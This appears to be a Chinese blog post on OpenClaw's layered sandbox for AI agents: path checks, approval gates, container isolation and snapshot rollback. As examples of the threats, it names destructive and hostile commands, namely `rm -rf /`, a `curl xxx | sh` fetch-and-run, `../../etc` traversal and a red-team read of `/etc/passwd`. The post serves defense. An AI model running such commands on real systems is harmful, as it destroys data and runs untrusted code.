---
title: OpenClaw sandbox 安全模型拆解：Agent 为什么删不掉你的文件
feedId: 44151
source: 综合讨论
publishedAt: 2026-11-12
---

## 背景

让 Agent 直接碰文件系统，第一反应都是紧张：它要真执行了 `rm -rf` 怎么办？OpenClaw 的设计前提很明确：**模型输出不可信，提示词只是行为引导，不是安全边界**。所以安全性不是一句话承诺，而是分层叠加，每层独立兜底。

## 问题：单层防护都会漏

实际踩过的坑集中在四类：

- **提示词约束不可靠**：上下文一长、任务一复杂，"不要删文件"就可能被绕过或遗忘。
- **路径穿越**：`../../etc`、软链接指向工作区外、`/workspace-evil` 撞上 `/workspace` 前缀——字符串层面判断路径全都能绕。
- **MCP 第三方工具不走你的校验**：Agent 调用一个自带文件读写能力的 MCP server，它内部怎么处理路径，框架层未必管得到。
- **shell 是最大的口子**：审批门挡住了工具调用，但 `curl xxx | sh` 一句话就把任意代码放进来。

## 做法：四层防线

OpenClaw 的 sandbox 大致是这么叠的：

**第一层：workspace 边界。** 所有内置文件工具在执行前，把请求路径做 realpath 归一化（解软链接、解 `..`），再校验是否落在 workspace root 之内，越界直接拒绝并写审计日志。注意是"解析后再比较"，不是字符串前缀匹配。

**第二层：工具分级 + 审批门。** 只读操作自动放行；工作区内写操作放行；删除、批量覆盖、workspace 外路径、git push 这类破坏性动词触发人工审批，默认 deny。

**第三层：进程隔离。** shell 工具跑在容器里：非 root 用户、只挂载 workspace、根文件系统只读、网络默认关闭（要联网就配代理白名单）。这样即使模型拼出 `rm -rf /`，删的也只是容器内的临时层。

**第四层：快照回滚。** 任务启动前对 workspace 打 git snapshot，任何破坏性操作后可一键还原。前三层是"防出去"，这一层是"防自己"。

## 踩坑点

- **realpath 不是可选项**。见过用 `startsWith(root)` 做校验的实现，一个 symlink 就穿透了；还要注意分隔符边界，`/workspace-evil` 会骗过朴素前缀判断。
- **挂载范围贪大**。为省事把整个 home 挂进容器，sandbox 直接形同虚设。只挂 workspace。
- **容器是 root 且挂了 docker.sock**，等于没隔离。
- **MCP server 自己实现了文件 IO**：框架层的路径校验管不到它，必须在 server 侧再校验一次，且配置里显式声明允许目录——不信任调用方传来的路径。
- **嫌 bind mount 慢直接切 host 模式跑**，隔离等于白做。慢可以调 mount 一致性参数，不要拆防线。

## 可复用建议

1. 接入前过一遍清单：workspace 最小挂载、非 root、根文件系统只读、网络默认关、路径 realpath 校验、破坏性动词全部过审批门、snapshot 先行。
2. 接入任何 MCP server 前先问一句：它有没有自己的文件访问？有，就在 server 侧再收口一次。
3. 定期做红队测试：明确让 Agent 去读 `/etc/passwd`、写工作区外文件、删快照，验证每一层**真的会拒绝**，而不是"应该会拒绝"。

## 总结

"Agent 不会误删文件"不是一个功能，而是边界校验、审批门、容器隔离、快照回滚四层叠加的结果。核心原则只有一条：模型输出是不可信输入，任何一层都不能假设上一层已经安全。提示词负责让它配合，sandbox 负责让它翻不了车。

---

## 配图

![cover](https://cdn.jsdelivr.net/gh/ryry9966/meyo-assets3@main/images/2026-11-12/34e0c0ae09249adc.png)

![img1](https://cdn.jsdelivr.net/gh/ryry9966/meyo-assets3@main/images/2026-11-12/db4a00f41a601290.png)

![img2](https://cdn.jsdelivr.net/gh/ryry9966/meyo-assets3@main/images/2026-11-12/07e68d626662f119.png)

